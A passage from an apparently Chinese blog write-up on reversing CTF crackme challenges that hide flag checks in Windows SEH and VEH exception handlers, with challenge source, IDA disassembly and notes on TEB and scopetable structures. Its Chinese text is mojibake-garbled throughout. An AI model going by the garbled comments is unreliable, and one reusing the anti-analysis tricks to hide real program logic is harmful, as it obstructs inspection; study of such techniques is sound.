class="number">46</span>, <span class="number">72</span>, <span class="number">21</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">17</span>, <span class="number">69</span>, <span class="number">5</span>, <span class="number">62</span>, <span class="number">46</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">72</span>, <span class="number">46</span>, <span class="number">69</span>, <span class="number">33</span>, <span class="number">31</span>, <span class="number">10</span> &#125;;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(_enc1); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (_enc1[i] != (((_flag[i * <span class="number">2</span>] ^ <span class="number">55</span>) + <span class="number">4</span>) ^ <span class="number">66</span>))</span><br><span class="line">			&#123;</span><br><span class="line">				pExcepInfo-&gt;ContextRecord-&gt;Eip += <span class="number">0X42</span>;		<span class="comment">//Ê§ï¿½ÜµÄµØ·ï¿½</span></span><br><span class="line">				<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		pExcepInfo-&gt;ContextRecord-&gt;Eip += <span class="number">7</span>;				<span class="comment">//ï¿½ï¿½ï¿½Å¼ï¿½ï¿½Î»ï¿½ï¿½Ö¤ï¿½É¹ï¿½ï¿½ï¿½ï¿½ò´¥·ï¿½ï¿½ï¿½Ò»ï¿½ï¿½ï¿½ì³£(int 3)ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½SEHï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê¼ï¿½ï¿½Ö¤ï¿½ï¿½ï¿½ï¿½Î»</span></span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">seh_filter</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> code, <span class="keyword">struct</span> _EXCEPTION_POINTERS* pExcepInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (pExcepInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//ï¿½ï¿½Ö¤flagï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Î»</span></span><br><span class="line">		<span class="type">char</span>* _flag = (<span class="type">char</span>*)(pExcepInfo-&gt;ContextRecord-&gt;Ebx + <span class="number">9</span>);</span><br><span class="line">		<span class="type">char</span> _enc2[] = &#123;<span class="number">33</span>, <span class="number">86</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">125</span>, <span class="number">86</span>, <span class="number">71</span>, <span class="number">45</span>, <span class="number">98</span>, <span class="number">112</span>, <span class="number">125</span>, <span class="number">109</span>, <span class="number">45</span>, <span class="number">110</span>, <span class="number">71</span>, <span class="number">33</span>, <span class="number">98</span>, <span class="number">124</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">32</span>, <span class="number">71</span>, <span class="number">121</span>, <span class="number">71</span>, <span class="number">69</span>, <span class="number">124</span>, <span class="number">68</span>, <span class="number">114</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">68</span>&#125;;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(_enc2); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (_enc2[i] != (((_flag[i * <span class="number">2</span>+<span class="number">1</span>] ^ <span class="number">77</span>) - <span class="number">4</span>) ^ <span class="number">0X13</span> ^ (pExcepInfo-&gt;ContextRecord-&gt;Eip &amp; <span class="number">0XFF</span>)))</span><br><span class="line">			&#123;</span><br><span class="line">				pExcepInfo-&gt;ContextRecord-&gt;Eip += <span class="number">0X36</span>;		<span class="comment">//Ê§ï¿½ÜµÄµØ·ï¿½</span></span><br><span class="line">				<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		pExcepInfo-&gt;ContextRecord-&gt;Eip += <span class="number">0X3F</span>;				<span class="comment">//ï¿½ï¿½×ªï¿½ï¿½ï¿½É¹ï¿½</span></span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> NTAPI <span class="title">TLS_CALLBACK</span><span class="params">(PVOID DllHandle, DWORD Reason, PVOID Reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">AddVectoredExceptionHandler</span>(<span class="number">1</span>, &amp;VectExcepHandler);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">CheckFlagFormat</span><span class="params">(<span class="type">char</span>* flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> prefix[<span class="number">10</span>] = &#123; <span class="number">109</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>,<span class="number">76</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">123</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strlen</span>(flag) &gt; <span class="number">72</span> || <span class="built_in">strlen</span>(flag) &lt; <span class="number">10</span> || <span class="built_in">strncmp</span>(flag, prefix, <span class="number">9</span>) || flag[<span class="number">71</span>] != <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintSuccess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> success[<span class="number">30</span>] = &#123; <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">33</span>, <span class="number">0</span> &#125;; </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, success);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintFailed</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> failed[<span class="number">30</span>] = &#123; <span class="number">84</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">32</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">33</span> ,<span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, failed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> flag[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">char</span> inputHint[<span class="number">100</span>] = &#123; <span class="number">80</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">32</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">112</span>,<span class="number">117</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">121</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">114</span>,<span class="number">32</span>,<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">58</span>,<span class="number">32</span>,<span class="number">0</span> &#125;; <span class="comment">//Please input your flag:</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, inputHint);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">CheckFlagFormat</span>(flag))</span><br><span class="line">		<span class="keyword">goto</span> LabelFailed;</span><br><span class="line"></span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		__asm &#123;</span><br><span class="line">			lea ebx, flag;</span><br><span class="line">			<span class="keyword">xor</span> eax, eax;</span><br><span class="line">			mov dword ptr ds : [eax] , <span class="number">0</span>;</span><br><span class="line">			mov edx, <span class="number">0</span>;</span><br><span class="line">			div edx;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	__except (<span class="built_in">seh_filter</span>(<span class="built_in">GetExceptionCode</span>(), <span class="built_in">GetExceptionInformation</span>()))</span><br><span class="line">	&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">LabelFailed:</span><br><span class="line">	<span class="built_in">PrintFailed</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">PrintSuccess</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.CRT$XLX&quot;</span>)				</span></span><br><span class="line">PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK,  <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br></pre></td></tr></table></figure>

<p>è™½è¯´ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„vscodeä¸Šè¿™ä¸ª__try __exceptç”¨ä¸äº†â€¦<br>ç»“åˆåšäº†çš„å‡ é“é¢˜å‘ç°ä¸€èˆ¬éƒ½æ˜¯å…ˆå¤„ç†SEH(__try __exceptå—) ç„¶åå†å¤„ç†VEH(ä¸€èˆ¬åœ¨å¼€å¤´åŠ AddVectorâ€¦(Handler))</p>
<h2 id="hgame2022-creakme2"><a href="#hgame2022-creakme2" class="headerlink" title="hgame2022 creakme2"></a>hgame2022 creakme2</h2><p>æ²¡æ‰¾åˆ°é™„ä»¶ å¤§è‡´çœ‹çœ‹æ±‡ç¼– å¯¹åº”çš„å°±æ˜¯å¼€å¤´æåˆ°çš„å¼‚å¸¸æ˜¯æœ‰è§¦å‘æ¡ä»¶çš„ï¼<br>å¸¸è§„çš„xteaåŠ å¯† å¾—åˆ°çš„å´æ˜¯ä¹±ç <br>çœ‹çœ‹æ±‡ç¼–</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000140001112</span> loc_140001112:                          ; DATA XREF: .rdata:<span class="number">00000001400027</span>C4â†“o</span><br><span class="line">.text:<span class="number">0000000140001112</span>                                         ; .rdata:<span class="number">00000001400027</span>D4â†“o</span><br><span class="line">.text:<span class="number">0000000140001112</span> ;   __try &#123; <span class="comment">// __except at loc_140001150</span></span><br><span class="line">.text:<span class="number">0000000140001112</span> ;     __try &#123; <span class="comment">// __except at loc_140001141</span></span><br><span class="line">.text:<span class="number">0000000140001112</span>                 mov     eax, cs:dword_140003034</span><br><span class="line">.text:<span class="number">0000000140001118</span>                 mov     ecx, [rsp+<span class="number">58</span>h+var_38]</span><br><span class="line">.text:<span class="number">000000014000111</span>C                 add     ecx, eax</span><br><span class="line">.text:<span class="number">000000014000111</span>E                 mov     eax, ecx</span><br><span class="line">.text:<span class="number">0000000140001120</span>                 mov     [rsp+<span class="number">58</span>h+var_38], eax</span><br><span class="line">.text:<span class="number">0000000140001124</span>                 mov     eax, [rsp+<span class="number">58</span>h+var_38]</span><br><span class="line">.text:<span class="number">0000000140001128</span>                 sar     eax, <span class="number">1F</span>h</span><br><span class="line">.text:<span class="number">000000014000112B</span>                 mov     [rsp+<span class="number">58</span>h+var_28], eax</span><br><span class="line">.text:<span class="number">000000014000112F</span>                 mov     eax, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000140001134</span>                 cdq</span><br><span class="line">.text:<span class="number">0000000140001135</span>                 mov     ecx, [rsp+<span class="number">58</span>h+var_28]</span><br><span class="line">.text:<span class="number">0000000140001139</span>                 idiv    ecx</span><br><span class="line">.text:<span class="number">000000014000113B</span>                 mov     [rsp+<span class="number">58</span>h+var_1C], eax</span><br><span class="line">.text:<span class="number">000000014000113F</span>                 jmp     <span class="type">short</span> loc_14000114E</span><br><span class="line">.text:<span class="number">000000014000113F</span> ;     &#125; <span class="comment">// starts at 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001141</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000140001141</span></span><br><span class="line">.text:<span class="number">0000000140001141</span> loc_140001141:                          ; DATA XREF: .rdata:<span class="number">00000001400027</span>C4â†“o</span><br><span class="line">.text:<span class="number">0000000140001141</span> ;   __except(loc_140001DF6) <span class="comment">// owned by 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001141</span>                 mov     eax, [rsp+<span class="number">58</span>h+var_38]</span><br><span class="line">.text:<span class="number">0000000140001145</span>                 <span class="keyword">xor</span>     eax, <span class="number">1234567</span>h</span><br><span class="line">.text:<span class="number">000000014000114</span>A                 mov     [rsp+<span class="number">58</span>h+var_38], eax</span><br><span class="line">.text:<span class="number">000000014000114</span>E</span><br><span class="line">.text:<span class="number">000000014000114</span>E loc_14000114E:                          ; CODE XREF: sub_140001070+CFâ†‘j</span><br><span class="line">.text:<span class="number">000000014000114</span>E                 jmp     <span class="type">short</span> loc_140001158</span><br><span class="line">.text:<span class="number">000000014000114</span>E ;   &#125; <span class="comment">// starts at 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001150</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000140001150</span></span><br><span class="line">.text:<span class="number">0000000140001150</span> loc_140001150:                          ; DATA XREF: .rdata:<span class="number">00000001400027</span>D4â†“o</span><br><span class="line">.text:<span class="number">0000000140001150</span> ;   __except(loc_140001E21) <span class="comment">// owned by 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001150</span>                 mov     [rsp+<span class="number">58</span>h+var_38], <span class="number">9E3779</span>B1h</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜¾ç„¶çš„SEH 0000000140001139æ®µå¯èƒ½ä¼šè§¦å‘ä¸€ä¸ªé™¤é›¶å¼‚å¸¸<br>æ³¨æ„åˆ°å‰é¢çš„</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000140001128</span>                 sar     eax, <span class="number">1F</span>h</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å½“ eax&gt;&gt;31 å˜æˆ0çš„æ—¶å€™ å°±ä¼šè§¦å‘å¼‚å¸¸</p>
<p>Handler</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000140001141</span> loc_140001141:                          ; DATA XREF: .rdata:<span class="number">00000001400027</span>C4â†“o</span><br><span class="line">.text:<span class="number">0000000140001141</span> ;   __except(loc_140001DF6) <span class="comment">// owned by 140001112</span></span><br><span class="line">.text:<span class="number">0000000140001141</span>                 mov     eax, [rsp+<span class="number">58</span>h+var_38]</span><br><span class="line">.text:<span class="number">0000000140001145</span>                 <span class="keyword">xor</span>     eax, <span class="number">1234567</span>h</span><br><span class="line">.text:<span class="number">000000014000114</span>A                 mov     [rsp+<span class="number">58</span>h+var_38], eax</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè§¦å‘é™¤é›¶å¼‚å¸¸åå°±ä¼šå¯¹xteaçš„å…³é”®å˜é‡å€¼(sum v4) è¿›è¡Œxor 0x1234567çš„æ“ä½œ</p>
<p>è¿˜æ˜¯è´´ä»½æºç  ä¾›ä»”ç»†åˆ†æå­¦ä¹ :</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">FilterFuncofDBZ</span><span class="params">(<span class="type">int</span> dwExceptionCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwExceptionCode == EXCEPTION_INT_DIVIDE_BY_ZERO)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf(&quot;DIVIDE_BY_ZERO catch\n&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">FilterFuncofOF</span><span class="params">(<span class="type">int</span> dwExceptionCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwExceptionCode == EXCEPTION_INT_OVERFLOW)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//printf(&quot;OVERFLOW catch\n&quot;);</span></span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_EXECUTE_HANDLER;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">encipher</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_rounds, <span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">uint32_t</span> key[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; num_rounds; i++) &#123;</span><br><span class="line">        v0 += (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        __try &#123;</span><br><span class="line">            __try &#123;</span><br><span class="line">            sum += delta;</span><br><span class="line">            a=<span class="number">1</span> / (sum &gt;&gt; <span class="number">31</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            __except (<span class="built_in">FilterFuncofDBZ</span>(<span class="built_in">GetExceptionCode</span>()))</span><br><span class="line">            &#123;</span><br><span class="line">                sum ^= <span class="number">0x1234567</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;__except (<span class="built_in">FilterFuncofOF</span>(<span class="built_in">GetExceptionCode</span>()))</span><br><span class="line">        &#123;</span><br><span class="line">            sum = <span class="number">0x9E3779B1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v1 += (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%x\n&quot;, sum);</span></span><br><span class="line">    v[<span class="number">0</span>] = v0; v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¤–å±‚ç”šè‡³è¿˜å¥—äº†ä¸ªæ•´æ•°æº¢å‡ºå¼‚å¸¸ åªæ˜¯å¹¶æ²¡æœ‰è§¦å‘</p>
<h1 id="è¿›é˜¶çŸ¥è¯†ç‚¹"><a href="#è¿›é˜¶çŸ¥è¯†ç‚¹" class="headerlink" title="è¿›é˜¶çŸ¥è¯†ç‚¹"></a><del>è¿›é˜¶çŸ¥è¯†ç‚¹</del></h1><h2 id="TEB"><a href="#TEB" class="headerlink" title="TEB"></a>TEB</h2><p>VC++ç¼–è¯‘å™¨ä¼šå¯¹SEHåšå¢å¼ºç‰ˆæœ¬ è¿™é‡Œç®€å•å­¦ä¹ ä»¥ä¸‹ä¸SEHæœ‰å…³çš„TEB(çº¿ç¨‹ç¯å¢ƒå—)çš„çŸ¥è¯†</p>
<h3 id="NT-TIB"><a href="#NT-TIB" class="headerlink" title="_NT_TIB"></a>_NT_TIB</h3><p>TIB: çº¿ç¨‹ä¿¡æ¯å—</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>	<span class="title class_">_NT_TIB</span>&#123;</span><br><span class="line">	 <span class="keyword">struct</span>	<span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> *ExceptionList;</span><br><span class="line">	 PVOID StackBase;</span><br><span class="line">	 PVOID StackLimit; </span><br><span class="line">	 PVOID SubSystemTib; </span><br><span class="line">	 <span class="keyword">union</span> &#123;</span><br><span class="line">		PVOID FiberData; </span><br><span class="line">		DWORD Version;</span><br><span class="line">	 &#125;; </span><br><span class="line">	 PVOID ArbitraryUserPointer;</span><br><span class="line"> 	 <span class="keyword">struct</span>	<span class="title class_">_NT_TIB</span> *Self;</span><br><span class="line">&#125; NT_TIB;</span><br><span class="line"><span class="keyword">typedef</span> NT_TIB *PNT_TIB;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªæˆå‘˜ ExceptionListæŒ‡é’ˆ æŒ‡å‘_EXCEPTION_REGISTRATION_RECORDç»“æ„ä½“ç»„æˆçš„é“¾è¡¨ ä¹Ÿå°±æ˜¯SEHé“¾</p>
<h3 id="TEBè®¿é—®æ–¹æ³•"><a href="#TEBè®¿é—®æ–¹æ³•" class="headerlink" title="TEBè®¿é—®æ–¹æ³•"></a>TEBè®¿é—®æ–¹æ³•</h3><p>Ntdll.NtCurrentTeb() è¿”å›å½“å‰çº¿ç¨‹TEBç»“æ„ä½“çš„åœ°å€</p>
<h2 id="VC-ç¼–è¯‘å™¨çº§çš„SEHå®ç°"><a href="#VC-ç¼–è¯‘å™¨çº§çš„SEHå®ç°" class="headerlink" title="VC++ç¼–è¯‘å™¨çº§çš„SEHå®ç°"></a>VC++ç¼–è¯‘å™¨çº§çš„SEHå®ç°</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION</span></span><br><span class="line">&#123;</span><br><span class="line">ã€€ã€€<span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION</span> *prev;      <span class="comment">//ebp-0x14</span></span><br><span class="line">ã€€ã€€<span class="type">void</span>                           *handler;   <span class="comment">//ebp-0x0c</span></span><br><span class="line">ã€€ã€€<span class="keyword">struct</span> <span class="title class_">scopetable_entry</span>        *scopetable;<span class="comment">//ebp-8</span></span><br><span class="line"><span class="comment">//ç±»å‹ä¸º scopetable_entry çš„æ•°ç»„</span></span><br><span class="line">ã€€ã€€<span class="type">int</span>                            trylevel;   <span class="comment">//ebp-4</span></span><br><span class="line"><span class="comment">//æ•°ç»„ä¸‹æ ‡ï¼Œç”¨æ¥ç´¢å¼• scopetable ä¸­çš„æ•°ç»„æˆå‘˜</span></span><br><span class="line">ã€€ã€€<span class="type">int</span>                            _ebp;       <span class="comment">//ebp</span></span><br><span class="line"><span class="comment">//åŒ…å«è¯¥ _EXCEPTION_REGISTRATION ç»“æ„ä½“çš„å‡½æ•°çš„æ ˆå¸§æŒ‡é’ˆ</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å¯¹æ¯”åŸå…ˆçš„ç»“æ„ä½“:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">_EXCEPTION_REGISTRATION_RECORD</span> *Next;</span><br><span class="line">    <span class="comment">//æŒ‡å‘ä¸‹ä¸€ä¸ª EXCEPTION_REGISTRATION_RECORD</span></span><br><span class="line"></span><br><span class="line">    PEXCEPTION_DISPOSITION Handler;  </span><br><span class="line">    <span class="comment">//æŒ‡å‘å¼‚å¸¸å¤„ç†å‡½æ•°</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD,*PEXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>

<h3 id="SCOPETABLE"><a href="#SCOPETABLE" class="headerlink" title="_SCOPETABLE"></a>_SCOPETABLE</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SCOPETABLE</span></span><br><span class="line">&#123;</span><br><span class="line">ã€€ã€€ DWORD previousTryLevel; <span class="comment">//å®šä½å‰ä¸€ä¸ªtryå—çš„ç´¢å¼•å€¼</span></span><br><span class="line">ã€€ã€€ DWORD lpfnFilter; <span class="comment">//å½“å‰tryå—çš„è¿‡æ»¤å‡½æ•°</span></span><br><span class="line">ã€€ã€€ DWORD lpfnHandler; <span class="comment">//å½“å‰tryå—çš„ç»ˆæ­¢å‡½æ•°</span></span><br><span class="line">&#125;SCOPETABLE, *PSCOPETABLE;</span><br></pre></td></tr></table></figure>

<h2 id="æ‰©å±•å¼‚å¸¸å¤„ç†æœºåˆ¶"><a href="#æ‰©å±•å¼‚å¸¸å¤„ç†æœºåˆ¶" class="headerlink" title="æ‰©å±•å¼‚å¸¸å¤„ç†æœºåˆ¶"></a>æ‰©å±•å¼‚å¸¸å¤„ç†æœºåˆ¶</h2><p>æœ€åˆçš„è®¾è®¡ æ¯ä¸ª__try __exceptå—å¯¹åº”ä¸€ä¸ªEXCEPTION_REGISTRATION<br>ä½†VSå®é™…å®ç°æ—¶ å¯¹äºåµŒå¥—çš„__try __exceptå— ä¸ç®¡é‡Œé¢è¿˜æœ‰å¤šå°‘å—__try __exceptå— éƒ½åªå°†ä¸€ä¸ªEXCEPTION_REGISTRATIONæŒ‚å…¥å½“å‰çº¿ç¨‹çš„å¼‚å¸¸é“¾è¡¨ä¸­<br>MSCæä¾›ä¸€ä¸ªå¤„ç†å‡½æ•° å³ EXCEPTION_REGISTRATION::handler è¢«è®¾ç½®ä¸º MSCçš„æŸä¸ªå‡½æ•°è€Œä¸æ˜¯æˆ‘ä»¬è‡ªå·±æä¾›çš„__exceptå— è€Œæˆ‘ä»¬è‡ªå·±æä¾›çš„å¤šä¸ª__exceptå—è¢«å­˜å‚¨åœ¨ EXCEPTION_REGISTRATION::scopetable æ•°ç»„ä¸­</p>
<h1 id="é¢˜ç›®-1"><a href="#é¢˜ç›®-1" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h1><h2 id="SCTF2019-creakme"><a href="#SCTF2019-creakme" class="headerlink" title="SCTF2019 creakme"></a>SCTF2019 creakme</h2><p>orz è¿™é¢˜çœŸçš„éš¾â€¦ ä¸å¾—ä¸æ„Ÿæ…¨IDAå¼ºå¤§çš„FindCryptæ’ä»¶(é€¼ç€æˆ‘æ›´æ–°äº†IDAPRO8.3æ’ä»¶ç‰ˆâ€¦)<br>IDAæ‰“å¼€ mainå·¨é•¿â€¦<br>ä¸€çœ‹æ±‡ç¼– å¤§å¤§çš„ _main_SEH!</p>
<p>sub_4024A0çš„æ±‡ç¼–ä»£ç :</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00402320</span> ; __unwind &#123; <span class="comment">// __except_handler4</span></span><br><span class="line">.text:<span class="number">00402320</span>                 push    ebp</span><br><span class="line">.text:<span class="number">00402321</span>                 mov     ebp, esp        ; _ebp</span><br><span class="line">.text:<span class="number">00402323</span>                 push    <span class="number">0F</span>FFFFFFEh      ; trylevel</span><br><span class="line">.text:<span class="number">00402325</span>                 push    offset stru_407B58 ; scopetable</span><br><span class="line">.text:<span class="number">0040232</span>A                 push    offset __except_handler4 ; *handler</span><br><span class="line">.text:<span class="number">0040232F</span>                 mov     eax, large fs:<span class="number">0</span> ; *prev FS:[<span class="number">0</span>]æŒ‡å‘SEHèµ·å§‹åœ°å€</span><br><span class="line">.text:<span class="number">00402335</span>                 push    eax</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå…¥æ ˆçš„åˆšå¥½å’Œå‰é¢æåˆ°çš„å¢å¼ºç‰ˆSEHç»“æ„ä½“å»åˆ<br>å…³é”®çš„æ˜¯ scopetable<br>ç‚¹å‡»æŸ¥çœ‹</p>
